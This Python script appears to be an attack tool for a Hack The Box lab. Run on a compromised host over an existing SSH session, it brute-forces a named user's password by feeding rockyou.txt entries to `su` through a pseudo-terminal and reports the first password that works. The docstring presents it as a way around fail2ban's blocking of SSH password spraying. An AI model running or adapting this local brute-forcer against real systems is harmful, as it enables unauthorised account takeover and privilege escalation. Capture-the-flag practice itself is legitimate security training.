#!/usr/bin/env python3
"""Local `su` wordlist (run ON THE TARGET over an existing SSH session).

sshd is fail2ban'd from the VPN. Spray SSH from Kali and :22 drops for minutes.
`su` from a single svc-infra shell is the intended hop to the user mailbox.

Usage (on the box):
  python3 su_brute.py martin_cole /tmp/ry80.txt
  python3 su_brute.py martin_cole --rockyou-head 200
"""
from __future__ import annotations

import argparse
import os
import pty
import select
import sys
import time

OK_MARK = "HTB_SU_OK"


def try_su(user: str, password: str, timeout: float) -> tuple[bool, str]:
    pid, fd = pty.fork()
    if pid == 0:
        os.environ["TERM"] = "dumb"
        os.execvp("su", ["su", "-", user, "-c", f"echo {OK_MARK}; id"])
        os._exit(1)

    buf = b""
    sent = False
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.2)
        if fd not in r:
            continue
        try:
            chunk = os.read(fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if not sent and b"assword" in buf:
            try:
                os.write(fd, (password + "\n").encode())
            except OSError:
                break
            sent = True
        if OK_MARK.encode() in buf:
            try:
                os.waitpid(pid, 0)
            except ChildProcessError:
                pass
            try:
                os.close(fd)
            except OSError:
                pass
            return True, buf.decode("utf-8", "replace")

    try:
        os.close(fd)
    except OSError:
        pass
    try:
        os.kill(pid, 9)
        os.waitpid(pid, 0)
    except OSError:
        pass
    return False, buf.decode("utf-8", "replace")


def load_list(path: str | None, head: int | None) -> list[str]:
    if path:
        lines = open(path, "r", errors="ignore").read().splitlines()
        return [ln.strip() for ln in lines if ln.strip()]
    rockyou = "/usr/share/wordlists/rockyou.txt"
    if not os.path.isfile(rockyou):
        sys.exit(f"[-] {rockyou} missing — scp a slice to the box and pass the path")
    n = head or 80
    out: list[str] = []
    with open(rockyou, "r", errors="ignore") as fh:
        for line in fh:
            w = line.strip()
            if w:
                out.append(w)
            if len(out) >= n:
                break
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("user")
    ap.add_argument("wordlist", nargs="?", help="one password per line (copied onto the box)")
    ap.add_argument("--rockyou-head", type=int, default=0, help="use first N of local rockyou.txt")
    ap.add_argument("--timeout", type=float, default=4.0, help="seconds per attempt (su delays ~2s)")
    args = ap.parse_args()

    words = load_list(args.wordlist, args.rockyou_head or None)
    if not words:
        print("[-] empty wordlist", file=sys.stderr)
        return 2

    print(f"[*] su - {args.user}  {len(words)} candidates", file=sys.stderr)
    for i, pw in enumerate(words, 1):
        ok, out = try_su(args.user, pw, args.timeout)
        if ok:
            print(f"[+] HIT {args.user} : {pw}")
            print(out)
            return 0
        if i % 10 == 0:
            print(f"[.] {i}/{len(words)}", file=sys.stderr)
    print("[-] no hit", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
